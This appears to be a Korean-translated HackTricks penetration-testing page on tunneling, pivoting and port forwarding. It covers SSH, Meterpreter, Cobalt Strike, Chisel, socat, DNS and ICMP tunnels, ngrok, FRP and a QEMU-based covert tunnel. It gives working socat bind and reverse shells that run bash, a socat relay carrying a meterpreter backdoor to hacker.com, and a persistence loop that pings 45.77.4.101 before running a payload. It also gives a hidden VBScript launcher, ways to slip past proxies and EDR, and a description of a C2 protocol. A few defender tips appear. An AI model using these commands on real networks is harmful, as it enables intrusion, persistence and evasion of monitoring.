# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** 및 **SYN** 스캔은 socks 프록시를 통해 터널링할 수 없으므로 **ping 탐지**를 **비활성화**해야 합니다 (`-Pn`) 그리고 **TCP 스캔**(`-sT`)을 지정해야 합니다.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 그래픽 연결 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH 서버에서 새 포트 열기 --> 다른 포트
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

로컬 포트 --> 손상된 호스트 (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

로컬 포트 --> 손상된 호스트 (SSH) --> 어디든
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

이것은 DMZ를 통해 내부 호스트에서 귀하의 호스트로 리버스 셸을 얻는 데 유용합니다:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

두 장치에서 **루트 권한이 필요합니다** (새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
서버 측에서 포워딩 활성화
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
클라이언트 측에 새 경로 설정
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **보안 – 테라핀 공격 (CVE-2023-48795)**
> 2023 테라핀 다운그레이드 공격은 중간자 공격자가 초기 SSH 핸드셰이크를 조작하고 **모든 포워딩 채널** ( `-L`, `-R`, `-D` )에 데이터를 주입할 수 있게 합니다. 클라이언트와 서버 모두 패치되었는지 확인하세요 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 또는 SSH 터널에 의존하기 전에 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 `sshd_config`/`ssh_config`에서 명시적으로 비활성화하세요.

## SSHUTTLE

**ssh**를 통해 **서브네트워크**로 모든 **트래픽**을 호스트를 통해 **터널링**할 수 있습니다.\
예를 들어, 10.10.10.0/24로 가는 모든 트래픽을 포워딩합니다.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
개인 키로 연결하기
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

로컬 포트 --> 손상된 호스트 (활성 세션) --> 제3_박스:포트
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
다른 방법:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS 프록시

모든 인터페이스에서 수신 대기하는 팀 서버에서 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 이 경우, **포트는 비콘 호스트에서 열립니다**, 팀 서버가 아니라 팀 서버로 트래픽이 전송되고, 그곳에서 지정된 호스트:포트로 전송됩니다.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
To note:

- Beacon의 리버스 포트 포워드는 **개별 머신 간의 중계가 아니라 Team Server로 트래픽을 터널링하기 위해 설계되었습니다**.
- 트래픽은 **Beacon의 C2 트래픽 내에서 터널링됩니다**, P2P 링크를 포함하여.
- **리버스 포트 포워드를 생성하는 데 관리자 권한이 필요하지 않습니다**.

### rPort2Port local

> [!WARNING]
> 이 경우, **포트는 비콘 호스트에서 열리며**, Team Server가 아니라 **트래픽은 Cobalt Strike 클라이언트로 전송됩니다** (Team Server가 아니라) 그리고 거기서 지정된 호스트:포트로 전송됩니다.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

웹 파일 터널을 업로드해야 합니다: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 릴리스 페이지에서 다운로드할 수 있습니다.\
**클라이언트와 서버에 동일한 버전을 사용해야 합니다.**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 포트 포워딩
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**에이전트와 프록시에 동일한 버전을 사용하세요**

### 터널링
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### 에이전트 바인딩 및 리스닝
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### 에이전트의 로컬 포트 접근
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

역방향 터널. 터널은 피해자에서 시작됩니다.\
127.0.0.1:1080에 socks4 프록시가 생성됩니다.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM 프록시**를 통한 피벗팅
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 바인드 셸
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### 리버스 셸
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port through socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter를 통한 SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
다음과 같이 피해자의 콘솔에서 마지막 줄 대신 이 줄을 실행하여 **비인증 프록시**를 우회할 수 있습니다:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat 터널

**/bin/sh 콘솔**

클라이언트와 서버 양쪽에 인증서를 생성합니다.
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

로컬 SSH 포트(22)를 공격자 호스트의 443 포트에 연결합니다.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

콘솔 PuTTY 버전과 비슷합니다 (옵션은 ssh 클라이언트와 매우 유사합니다).

이 바이너리는 피해자에서 실행될 것이며 ssh 클라이언트이므로, 역 연결을 위해 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서 접근 가능한 포트만을 우리 머신의 포트로 포워딩하려면:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

로컬 관리자가 되어야 합니다 (모든 포트에 대해)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**RDP 액세스가 시스템에 필요합니다.**\
다운로드:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 원격 데스크톱 서비스 기능에서 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP 연결을 통한 패킷 터널링**을 담당합니다.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

클라이언트 컴퓨터에서 **`SocksOverRDP-Plugin.dll`**을 다음과 같이 로드합니다:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **희생자**에 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화되었다는** **프롬프트**를 받게 되고, **127.0.0.1:1080**에서 **대기**할 것입니다.

**RDP**를 통해 **연결**하고 희생자 머신에 `SocksOverRDP-Server.exe` 바이너리를 업로드 및 실행합니다:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
이제 공격자 머신에서 포트 1080이 수신 대기 중인지 확인하세요:
```
netstat -antb | findstr 1080
```
이제 [**Proxifier**](https://www.proxifier.com/) **를 사용하여 해당 포트를 통해 트래픽을 프록시할 수 있습니다.**

## Windows GUI 앱 프록시화

[**Proxifier**](https://www.proxifier.com/)를 사용하여 Windows GUI 앱이 프록시를 통해 탐색하도록 할 수 있습니다.\
**Profile -> Proxy Servers**에서 SOCKS 서버의 IP와 포트를 추가합니다.\
**Profile -> Proxification Rules**에서 프록시화할 프로그램의 이름과 프록시화할 IP에 대한 연결을 추가합니다.

## NTLM 프록시 우회

앞서 언급한 도구: **Rpivot**\
**OpenVPN**도 이를 우회할 수 있으며, 구성 파일에서 이러한 옵션을 설정합니다:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

프록시에 대해 인증하고 지정한 외부 서비스로 포트를 로컬에서 바인딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
예를 들어 포트 443을 포워딩합니다.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
이제, 예를 들어 피해자의 **SSH** 서비스가 포트 443에서 수신 대기하도록 설정하면, 공격자는 포트 2222를 통해 연결할 수 있습니다.\
또한 **meterpreter**를 사용하여 localhost:443에 연결하고 공격자가 포트 2222에서 수신 대기할 수도 있습니다.

## YARP

Microsoft에서 만든 리버스 프록시입니다. 여기에서 찾을 수 있습니다: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

두 시스템 모두에서 루트 권한이 필요하며, DNS 쿼리를 사용하여 tun 어댑터를 생성하고 데이터 터널링을 수행합니다.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성할 수 있습니다:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**

DNS를 통해 C\&C 채널을 설정합니다. 루트 권한이 필요하지 않습니다.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell에서**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)를 사용하여 PowerShell에서 dnscat2 클라이언트를 실행할 수 있습니다:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat을 이용한 포트 포워딩**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 프록시체인 DNS 변경

Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 socks 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2** (하드코딩됨)입니다. 이를 변경하려면 파일을 편집하세요: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경합니다. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.

## Go에서의 터널

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### 사용자 정의 DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 행위자는 *단지* 아웃바운드 **DNS** 및 **일반 HTTP POST** 트래픽을 악용하는 **이중 채널 C2 ("AK47C2")**를 생성했습니다 – 기업 네트워크에서 거의 차단되지 않는 두 가지 프로토콜입니다.

1. **DNS 모드 (AK47DNS)**
• 무작위 5자 SessionID (예: `H4T14`)를 생성합니다.  
• *작업 요청*에는 `1`을, *결과*에는 `2`를 접두사로 붙이고 다양한 필드(플래그, SessionID, 컴퓨터 이름)를 연결합니다.  
• 각 필드는 **ASCII 키 `VHBD@H`**로 XOR 암호화되고, 16진수로 인코딩되며 점으로 붙여져 최종적으로 공격자가 제어하는 도메인으로 끝납니다:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• 요청은 **TXT** (및 백업 **MG**) 레코드에 대해 `DnsQuery()`를 사용합니다.  
• 응답이 0xFF 바이트를 초과하면 백도어는 데이터를 63바이트 조각으로 분할하고 마커를 삽입합니다: `s<SessionID>t<TOTAL>p<POS>` 그래서 C2 서버가 이를 재정렬할 수 있습니다.

2. **HTTP 모드 (AK47HTTP)**
• JSON 봉투를 만듭니다:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 전체 블롭은 XOR-`VHBD@H` → 16진수 → **`POST /`**의 본문으로 전송됩니다. 헤더는 `Content-Type: text/plain`입니다.  
• 응답은 동일한 인코딩을 따르며 `cmd` 필드는 `cmd.exe /c <command> 2>&1`로 실행됩니다.

블루 팀 노트  
• 첫 번째 레이블이 긴 16진수이고 항상 하나의 희귀 도메인으로 끝나는 비정상적인 **TXT 쿼리**를 찾으세요.  
• 상수 XOR 키 뒤에 ASCII-16진수가 있는 것은 YARA로 쉽게 감지할 수 있습니다: `6?56484244?484` (`VHBD@H`의 16진수).  
• HTTP의 경우 순수 16진수이고 2바이트의 배수인 text/plain POST 본문에 플래그를 지정하세요.

{{#note}}  
전체 채널은 **표준 RFC 준수 쿼리** 내에 적합하며 각 서브 도메인 레이블을 63바이트 이하로 유지하여 대부분의 DNS 로그에서 은밀하게 유지됩니다.  
{{#endnote}}

## ICMP 터널링

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

두 시스템 모두에서 루트 권한이 필요하여 tun 어댑터를 생성하고 ICMP 에코 요청을 사용하여 데이터 간에 터널링합니다.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**여기에서 다운로드**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **는 한 줄의 명령어로 솔루션을 인터넷에 노출하는 도구입니다.**\
_노출 URI는 다음과 같습니다:_ **UID.ngrok.io**

### 설치

- 계정 생성: https://ngrok.com/signup
- 클라이언트 다운로드:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 기본 사용법

**문서:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_필요한 경우 인증 및 TLS를 추가하는 것도 가능합니다._

#### TCP 터널링
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP를 통한 파일 노출
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP 호출 스니핑

_XSS, SSRF, SSTI 등에 유용 ..._\
stdout 또는 HTTP 인터페이스에서 직접 [http://127.0.0.1:4040](http://127.0.0.1:4000)에서.

#### 내부 HTTP 서비스 터널링
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 간단한 구성 예제

3개의 터널을 엽니다:

- 2 TCP
- 1 HTTP, /tmp/httpbin/에서 정적 파일 노출
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare의 `cloudflared` 데몬은 **로컬 TCP/UDP 서비스**를 노출하는 아웃바운드 터널을 생성할 수 있으며, 이를 위해 인바운드 방화벽 규칙이 필요하지 않습니다. Cloudflare의 엣지를 만남의 지점으로 사용합니다. 이는 이그레스 방화벽이 HTTPS 트래픽만 허용하고 인바운드 연결이 차단될 때 매우 유용합니다.

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 피벗
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS를 이용한 지속적인 터널
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
커넥터 시작:
```bash
cloudflared tunnel run mytunnel
```
모든 트래픽이 호스트에서 **443 포트를 통해 아웃바운드**로 나가기 때문에, Cloudflared 터널은 인그레스 ACL 또는 NAT 경계를 우회하는 간단한 방법입니다. 이진 파일은 일반적으로 권한이 상승된 상태로 실행되므로, 가능한 경우 컨테이너를 사용하거나 `--user` 플래그를 사용하세요.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp)는 **TCP, UDP, HTTP/S, SOCKS 및 P2P NAT 홀 펀칭**을 지원하는 적극적으로 유지 관리되는 Go 리버스 프록시입니다. **v0.53.0 (2024년 5월)**부터는 **SSH 터널 게이트웨이**로 작동할 수 있어, 대상 호스트가 추가 이진 파일 없이 기본 OpenSSH 클라이언트만 사용하여 리버스 터널을 생성할 수 있습니다.

### 클래식 리버스 TCP 터널
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 새로운 SSH 게이트웨이 사용하기 (frpc 바이너리 없음)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
위 명령은 피해자의 포트 **8080**을 **attacker_ip:9000**으로 게시하며, 추가 도구를 배포하지 않고도 수행됩니다 – 이는 living-off-the-land 피벗에 이상적입니다.

## QEMU를 이용한 은밀한 VM 기반 터널

QEMU의 사용자 모드 네트워킹(`-netdev user`)은 `hostfwd`라는 옵션을 지원하며, 이는 **호스트의 TCP/UDP 포트를 바인딩하고 이를 *게스트*로 전달합니다**. 게스트가 전체 SSH 데몬을 실행할 때, hostfwd 규칙은 일회용 SSH 점프 박스를 제공하며, 이는 완전히 임시 VM 내에서 살아 있습니다 – 모든 악성 활동과 파일이 가상 디스크에 남아 있기 때문에 EDR로부터 C2 트래픽을 숨기기에 완벽합니다.

### 간단한 원라이너
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 위의 명령은 **Tiny Core Linux** 이미지(`tc.qcow2`)를 RAM에서 실행합니다.  
• Windows 호스트의 포트 **2222/tcp**는 게스트 내부의 **22/tcp**로 투명하게 포워딩됩니다.  
• 공격자의 관점에서 대상은 단순히 포트 2222를 노출합니다. 해당 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH 서버에 의해 처리됩니다.  

### VBScript를 통한 은밀한 실행
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs`로 스크립트를 실행하면 창이 숨겨집니다.

### 게스트 내 지속성

Tiny Core는 상태 비저장 시스템이기 때문에 공격자는 일반적으로:

1. 페이로드를 `/opt/123.out`에 배치합니다.
2. `/opt/bootlocal.sh`에 추가합니다:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. 페이로드가 종료 시 `mydata.tgz`에 패킹되도록 `/opt/filetool.lst`에 `home/tc`와 `opt`를 추가합니다.

### 왜 이것이 탐지를 피하는가

• 두 개의 서명되지 않은 실행 파일(`qemu-system-*.exe`)만이 디스크에 접근하며, 드라이버나 서비스는 설치되지 않습니다.
• 호스트의 보안 제품은 **무해한 루프백 트래픽**을 감지합니다(실제 C2는 VM 내부에서 종료됨).
• 메모리 스캐너는 악성 프로세스 공간을 분석하지 않으며, 이는 다른 OS에 존재합니다.

### Defender 팁

• 사용자 쓰기 가능한 경로에 **예상치 못한 QEMU/VirtualBox/KVM 바이너리**에 대한 경고를 설정합니다.
• `qemu-system*.exe`에서 시작되는 아웃바운드 연결을 차단합니다.
• QEMU 시작 직후 즉시 바인딩되는 드문 리스닝 포트(2222, 10022, …)를 추적합니다.

---

## 확인할 다른 도구

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## 참고 문헌

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
